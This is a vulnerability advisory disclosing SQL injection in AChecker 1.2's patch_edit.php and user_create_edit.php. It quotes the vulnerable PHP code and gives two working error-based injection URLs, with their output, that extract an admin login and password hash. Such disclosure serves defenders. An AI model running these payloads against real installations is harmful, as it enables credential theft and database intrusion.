Product web page: http://www.atutor.ca
Affected version: 1.2 (build r530)
 
Summary: AChecker is an open source Web accessibility evaluation tool.
It can be used to review the accessibility of Web pages based on a variety
international accessibility guidelines.
 
Desc: Input passed via the parameter &#039;myown_patch_id&#039; in &#039;/updater/patch_edit.php&#039;
and the parameter &#039;id&#039; in &#039;/user/user_create_edit.php&#039; script is not properly
sanitised before being used in SQL queries. This can be exploited to manipulate
SQL queries by injecting arbitrary SQL code.
 
 
==========================================================================
 
/updater/patch_edit.php:
------------------------------
 
20: if (!isset($_REQUEST["myown_patch_id"]))
21: {
22:         $msg->addError(&#039;NO_ITEM_SELECTED&#039;);
23:         exit;
24: }
25:
26: $myown_patch_id = $_REQUEST["myown_patch_id"];
27:
28: $myownPatchesDAO = new MyownPatchesDAO();
29: $myownPatchesDependentDAO = new MyownPatchesDependentDAO();
30: $myownPatchesFilesDAO = new MyownPatchesFilesDAO();
31:
32: // URL called by form action
33: $savant->assign(&#039;url&#039;, dirname($_SERVER[&#039;PHP_SELF&#039;]) . "/patch_creator.php?myown_patch_id=" . $myown_patch_id);
34:
35: $savant->assign(&#039;patch_row&#039;, $myownPatchesDAO->getByID($myown_patch_id));
36: $savant->assign(&#039;dependent_rows&#039;, $myownPatchesDependentDAO->getByPatchID($myown_patch_id));
37: $savant->assign(&#039;file_rows&#039;, $myownPatchesFilesDAO->getByPatchID($myown_patch_id));
 
 
------------------------------------------------------------------------
 
/user/user_create_edit.php:
------------------------------
 
103: if (isset($_GET[&#039;id&#039;])) // edit existing user
104: {
105:         $usersDAO = new UsersDAO();
106:         $savant->assign(&#039;user_row&#039;, $usersDAO->getUserByID($_GET[&#039;id&#039;]));
107:         $savant->assign(&#039;show_password&#039;, false);
108:
109: }
 
==========================================================================
 
 
Tested on: Microsoft Windows XP Professional SP3 (EN)
           Apache 2.2.14 (Win32)
           PHP 5.3.1
           MySQL 5.1.41
 
 
Vulnerabilities discovered by Gjoko &#039;LiquidWorm&#039; Krstic
                              liquidworm gmail com
                              Zero Science Lab - http://www.zeroscience.mk
 
 
Advisory ID: ZSL-2011-5034
Advisory URL: http://www.zeroscience.mk/en/vulnerabilities/ZSL-2011-5034.php
 
 
01.08.2011
 
--
 
PoC:
 
 
- http://localhost/updater/patch_edit.php?myown_patch_id=1 and(select 1 from(select count(*),concat((select (select login) from `ac_users` limit 1,1),floor(rand(0)*2))x from `information_schema`.tables group by 2)j)
 
+ Output:
 
Duplicate entry &#039;admin1&#039; for key &#039;group_key&#039;
 
 
-==========================-
 
 
- http://localhost/user/user_create_edit.php?id=78 and(select 1 from(select count(*),concat((select (select password) from `ac_users` limit 1,1),floor(rand(0)*2))x from `information_schema`.tables group by 2)j)
 
+ Ouput:
 
Duplicate entry &#039;d033e22ae348aeb5660fc2140aec35850c4da9971&#039; for key &#039;group_key&#039;



